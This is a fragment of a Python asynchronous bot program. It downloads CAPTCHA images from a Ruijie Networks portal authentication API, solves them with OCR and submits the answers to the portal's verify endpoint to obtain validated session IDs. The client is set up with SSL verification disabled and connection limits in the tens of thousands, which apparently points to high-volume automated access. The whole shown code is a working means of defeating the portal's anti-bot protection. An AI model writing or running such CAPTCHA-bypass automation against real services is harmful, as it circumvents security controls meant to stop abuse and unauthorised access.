    _, thresh = cv2.threshold(gray, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
    _, buffer = cv2.imencode('.png', thresh)
    return _ocr.classification(buffer.tobytes()).upper()

async def Captcha_Text(image_bytes):
    return await asyncio.to_thread(_ocr_sync, image_bytes)

async def Captcha_Image(session, session_id):
    headers = {'user-agent': 'Mozilla/5.0'}
    params = {'sessionId': session_id, '_t': str(time.time())}
    async with session.get('https://portal-as.ruijienetworks.com/api/auth/captcha/image', params=params, headers=headers) as req:
        return await req.read()

async def Varify_Captcha(session, session_id, text):
    headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0'}
    json_data = {'sessionId': session_id, 'authCode': text}
    async with session.post('https://portal-as.ruijienetworks.com/api/auth/captcha/verify', headers=headers, json=json_data) as req:
        data = await req.json()
        return session_id if data.get("success") == True else None

async def main():
    global session, _connector
    timeout = aiohttp.ClientTimeout(total=30)
    _connector = aiohttp.TCPConnector(limit=20000, limit_per_host=10000, ssl=False)
    session = aiohttp.ClientSession(timeout=timeout, connector=_connector, connector_owner=False)
    try:
        asyncio.create_task(web_server())
        asyncio.create_task(github_update_scheduler())
        await bot.infinity_polling(timeout=20, request_timeout=20)
    finally:
        await session.close()
        await _connector.close()

if __name__ == '__main__':
    asyncio.run(main())
